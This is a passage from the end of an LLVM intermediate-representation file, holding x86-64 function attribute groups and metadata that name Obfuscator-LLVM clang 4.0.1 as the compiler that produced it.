attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146836174}
!2 = !{i32 -2146835765}
!3 = !{i32 -2146836302}
!4 = !{i32 -2146835893}
